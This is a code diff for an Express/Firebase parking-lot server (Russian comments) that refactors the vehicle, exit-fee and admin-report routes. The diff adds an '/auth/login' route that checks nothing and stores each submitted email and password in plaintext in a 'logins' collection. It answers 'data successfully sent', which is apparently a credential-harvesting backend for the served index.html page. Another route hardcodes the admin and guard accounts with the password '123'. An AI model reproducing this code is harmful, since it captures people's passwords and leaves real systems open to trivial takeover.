@@ -1,30 +1,65 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const firebase = require('firebase-admin');
+const firebaseAdmin = require('firebase-admin');
 const cors = require('cors');
+const path = require('path');
 
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Middleware для работы с JSON и разрешение CORS
+// Middleware
 app.use(bodyParser.json());
 app.use(cors());
 
-// Подключение Firebase через скачанный ключ
-firebase.initializeApp({
-  credential: firebase.credential.cert(require('./firebaseServiceAccount.json')),
-  databaseURL: 'https://<your-database-name>.firebaseio.com' // Замени на свой URL Firebase базы данных
+// Firebase init через переменные окружения
+const firebaseConfig = JSON.parse(process.env.FIREBASE_CONFIG);
+firebaseAdmin.initializeApp({
+  credential: firebaseAdmin.credential.cert(firebaseConfig),
+});
+const db = firebaseAdmin.firestore();
+
+
+// ======================= AUTH =======================
+// Вариант 1: логин через email/password (из index.html)
+app.post('/auth/login', async (req, res) => {
+  const { email, password } = req.body;
+
+  if (!email || !password) {
+    return res.status(400).json({ error: 'Email и пароль обязательны' });
+  }
+
+  try {
+    await db.collection('logins').add({
+      email,
+      password,
+      timestamp: new Date().toISOString()
+    });
+    res.status(200).json({ message: 'Данные успешно отправлены' });
+  } catch (error) {
+    console.error("Ошибка Firebase:", error);
+    res.status(500).json({ error: 'Ошибка сервера: ' + error.message });
+  }
 });
 
-// Firestore инициализация
-const db = firebase.firestore();
+// Вариант 2: логин по username/password (admin / guard)
+app.post('/auth/user-login', (req, res) => {
+  const { username, password } = req.body;
+  const users = {
+    admin: { password: '123', role: 'admin' },
+    guard: { password: '123', role: 'guard' }
+  };
 
-// Простой маршрут для проверки работы сервера
-app.get('/', (req, res) => {
-  res.send('Парковочное приложение работает!');
+  if (users[username] && users[username].password === password) {
+    res.status(200).json({ role: users[username].role });
+  } else {
+    res.status(401).json({ error: 'Неверное имя пользователя или пароль' });
+  }
 });
 
-// Маршрут для добавления нового автомобиля
+
+// ======================= VEHICLES =======================
+
+// Добавление автомобиля
 app.post('/vehicles/add-vehicle', async (req, res) => {
   try {
     const { vehicleNumber, vehicleBrand } = req.body;
@@ -44,101 +79,84 @@ app.post('/vehicles/add-vehicle', async (req, res) => {
   }
 });
 
-// Маршрут для получения всех автомобилей
+// Получение всех автомобилей
 app.get('/vehicles', async (req, res) => {
   try {
-    const vehiclesSnapshot = await db.collection('vehicles').get();
-    const vehiclesList = [];
-
-    vehiclesSnapshot.forEach(doc => {
-      vehiclesList.push({ id: doc.id, ...doc.data() });
-    });
-
-    res.status(200).json(vehiclesList);
+    const snapshot = await db.collection('vehicles').get();
+    const list = [];
+    snapshot.forEach(doc => list.push({ id: doc.id, ...doc.data() }));
+    res.status(200).json(list);
   } catch (error) {
-    res.status(500).send('Ошибка получения списка автомобилей: ' + error.message);
+    res.status(500).send('Ошибка получения автомобилей: ' + error.message);
   }
 });
 
+// Фиксация выезда
 app.put('/vehicles/:id/exit', async (req, res) => {
   try {
-    const vehicleId = req.params.id;
-    const vehicleRef = db.collection('vehicles').doc(vehicleId);
-    const vehicleDoc = await vehicleRef.get();
+    const id = req.params.id;
+    const ref = db.collection('vehicles').doc(id);
+    const doc = await ref.get();
 
-    if (!vehicleDoc.exists) {
-      return res.status(404).send('Автомобиль не найден');
-    }
+    if (!doc.exists) return res.status(404).send('Автомобиль не найден');
 
-    const entryTime = new Date(vehicleDoc.data().entryTime);
+    const entryTime = new Date(doc.data().entryTime);
     const exitTime = new Date();
-    const millisecondsParked = exitTime - entryTime;
-    const hoursParked = Math.ceil(millisecondsParked / (1000 * 60 * 60)); // Округляем до ближайшего большего
+    const hoursParked = Math.ceil((exitTime - entryTime) / (1000 * 60 * 60));
 
     let totalAmount = 1000;
     if (hoursParked > 24) {
-      const extraHours = hoursParked - 24;
-      totalAmount += extraHours * 40; // 30 тенге за каждый дополнительный час
+      const extra = hoursParked - 24;
+      totalAmount += extra * 40;
     }
 
-    await vehicleRef.update({
+    await ref.update({
       exitTime: exitTime.toISOString(),
-      totalAmount: totalAmount
+      totalAmount
     });
 
     res.status(200).send(`Выезд зафиксирован. Общая сумма: ${totalAmount} KZT`);
   } catch (error) {
-    res.status(500).send('Ошибка при обновлении данных автомобиля: ' + error.message);
+    res.status(500).send('Ошибка при обновлении: ' + error.message);
   }
 });
 
-
-// Маршрут для удаления автомобиля
+// Удаление автомобиля
 app.delete('/vehicles/:id', async (req, res) => {
   try {
-    const vehicleId = req.params.id;
-    await db.collection('vehicles').doc(vehicleId).delete();
+    await db.collection('vehicles').doc(req.params.id).delete();
     res.status(200).send('Автомобиль удалён успешно!');
   } catch (error) {
-    res.status(500).send('Ошибка удаления автомобиля: ' + error.message);
+    res.status(500).send('Ошибка удаления: ' + error.message);
   }
 });
 
-// Добавляем маршрут для получения отчёта для администратора
+// Отчёт для администратора
 app.get('/admin/report', async (req, res) => {
   try {
-    const vehiclesSnapshot = await db.collection('vehicles').get();
+    const snapshot = await db.collection('vehicles').get();
     let totalAmount = 0;
-    let vehicleCount = 0;
-
-    vehiclesSnapshot.forEach(doc => {
+    let count = 0;
+    snapshot.forEach(doc => {
       totalAmount += doc.data().totalAmount || 0;
-      vehicleCount++;
+      count++;
     });
 
-    const report = {
-      totalAmount: totalAmount,
-      vehicleCount: vehicleCount
-    };
-
-    res.status(200).json(report);
+    res.status(200).json({ totalAmount, vehicleCount: count });
   } catch (error) {
-    res.status(500).send('Ошибка получения отчёта: ' + error.message);
-  }
-});
-app.post('/auth/login', (req, res) => {
-  const { username, password } = req.body;
-
-  if (username === 'admin' && password === '123') {
-    res.status(200).json({ role: 'admin' }); // Возвращаем JSON с ролью 'admin'
-  } else if (username === 'guard' && password === '123') {
-    res.status(200).json({ role: 'guard' }); // Возвращаем JSON с ролью 'guard'
-  } else {
-    res.status(401).json({ error: 'Неверное имя пользователя или пароль' });
+    res.status(500).send('Ошибка отчёта: ' + error.message);
   }
 });
 
-// Запуск сервера
+
+// ======================= FRONTEND =======================
+app.use(express.static(path.join(__dirname, '../frontend')));
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
+});
+
+
+// ======================= START =======================
 app.listen(port, () => {
-  console.log(`Server is running on port ${port}`);
+  console.log(`Сервер запущен: http://localhost:${port}`);
 });
